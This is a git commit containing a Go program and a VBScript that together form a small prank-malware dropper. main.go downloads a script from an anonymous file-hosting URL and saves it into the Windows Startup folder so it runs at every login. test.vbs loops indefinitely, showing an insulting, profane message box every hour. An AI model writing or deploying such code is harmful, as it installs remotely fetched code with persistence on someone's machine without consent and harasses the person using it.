8c232375205485d4c71272d1eb899f018c637dee
Hiren.R <nan>
2022-05-21 22:55:42 +0100

    First commit

---
+++ main.go
@@ -0,0 +1,46 @@
+package main
+
+import (
+	"io"
+	"log"
+	"net/http"
+	"os"
+	"path/filepath"
+)
+
+func main() {
+	url := "https://anonfiles.com/zeLfCcidye/test_vbs"
+
+	dir, err := os.UserHomeDir()
+	if err != nil {
+		log.Fatalf("failed to get user home dir: %v", err)
+	}
+
+	path := filepath.Join(dir, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.vbs")
+	if err := DownloadFile(path, url); err != nil {
+		log.Fatalf("failed to download file: %v", err)
+	}
+}
+
+// DownloadFile will download a url to a local file. It's efficient because it will
+// write as it downloads and not load the whole file into memory.
+func DownloadFile(filepath string, url string) error {
+
+	// Get the data
+	resp, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Create the file
+	out, err := os.Create(filepath)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	// Write the body to file
+	_, err = io.Copy(out, resp.Body)
+	return err
+}
---
+++ test.vbs
@@ -0,0 +1,4 @@
+Do
+MsgBox("You are fat, GO TO THE FUCKING *gym*" , 2,"Close window = fat FOREVER")
+WScript.Sleep(3600000)
+Loop
